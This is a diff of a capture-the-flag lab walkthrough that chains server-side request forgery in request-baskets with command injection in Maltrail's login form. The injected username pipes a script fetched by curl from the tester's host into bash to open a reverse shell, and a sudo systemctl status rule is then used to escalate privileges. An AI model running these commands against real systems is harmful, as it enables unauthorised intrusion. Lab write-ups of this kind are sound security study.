@@ -120,5 +120,70 @@ https://notes.sjtu.edu.cn/s/MUUhEymt7
 
 POC: POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
 
+when setting up a forwarder
+
+![](20230717005846.png)
+
+setting up a netcat
+
+nc -lvp 443
+
+![](20230717005917.png)
+
+now moving on to exploitation
+
+we enable the proxy response
+
+![](20230717010723.png)
+
+not able ot connect
+
+![](20230717010734.png)
+
+maybe if i tried a curl request
+
+```
+curl --location 'http://10.10.11.224:55555/api/baskets/yesterday' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
+
+{"token":"9-CSIiJmEZBEMan8Kpzph1ruRwOiAC-nR5c90XUldVpL"}  
+```
+
+mahesh
+2hH3GujPIaU7uH8OFm1jZVQhYpKmBpiqRAuFhx2_NSfR
+
+ curl --location 'http://10.10.11.224:55555/api/baskets/mahesh1' --header 'Content-Type: application/json' --data '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}'
+
+{"token":"5pp6-6PMN7WkQs6_GIMtWxI_6Bgcvt6f2O2rZnDirLiW"}        
+
+![](20230717022747.png)
+
+command injection in mailtrail
+
+```
+curl 'http://10.10.11.224:55555/mahesh1/login'  --data 'username=;`curl 10.10.16.47:8000/rev.sh|bash`'
+```
+
+rev.sh connects to 1337 
+
+so starting a server 
+
+nc -lvp 1337
+
+and i got a shell
+
+![](20230717024925.png)
+
+on sudo -l :
+
+ (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+
+find / -user puma -ls 2>/dev/null
+
+# privilege escalation
 
 
+script /dev/null /bin/bash
+
+sudo /usr/bin/systemctl status trail.service
+
+![](20230717030603.png)
